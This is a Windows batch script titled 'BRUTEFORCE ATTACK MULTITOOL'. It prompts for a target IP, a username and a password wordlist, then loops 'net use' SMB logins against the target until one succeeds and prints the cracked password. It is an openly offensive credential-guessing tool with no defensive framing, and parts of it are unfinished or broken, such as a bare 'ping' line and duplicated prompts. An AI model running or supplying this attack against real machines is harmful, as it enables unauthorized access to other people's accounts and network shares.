@echo off
title BRUTEFORCE ATTACK MULTITOOL

:MAIN_MENU
color 02
echo  _____      _____             __             ___       _____       ___
echo |     \    /     |           /  \           |   |     |     \     |   |
echo |      \  /      |          /    \          |   |     |      \    |   |
echo |       \/       |         /      \         |   |     |    _  \   |   |
echo |    |\    /|    |        /   __   \        |   |     |   | \  \  |   |
echo |    | \__/ |    |       /   /  \   \       |   |     |   |  \  \ |   |
echo |    |      |    |      /   /    \   \      |   |     |   |   \  \|   |
echo |____|      |____|     /___/      \___\     |___|     |___|    \______|
echo                   _____      _____       _____________       _____        ___      ____      ____ 
echo                  |     \    /     |     |    _________|     |     \      |   |    |    |    |    |
echo                  |      \  /      |     |    |              |      \     |   |    |    |    |    |
echo                  |       \/       |     |    |              |       \    |   |    |    |    |    |
echo                  |                |     |    |______        |    _   \   |   |    |    |    |    |
echo                  |    |\    /|    |     |     ______|       |   | \   \  |   |    |    |    |    |
echo                  |    | \__/ |    |     |    |              |   |  \   \ |   |    |    \____/    |
echo                  |    |      |    |     |    |________      |   |   \   \|   |    \              /
echo                  |____|      |____|     |_____________|     |___|    \_______|     \____________/
echo press any key to continue 
pause > nul 


:COLLECT_DATA
set /p "IP=ENTER target IP: "
set /p "USER=ENTER target user name:"

:PING
ping 

:BRUTEFORCE
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success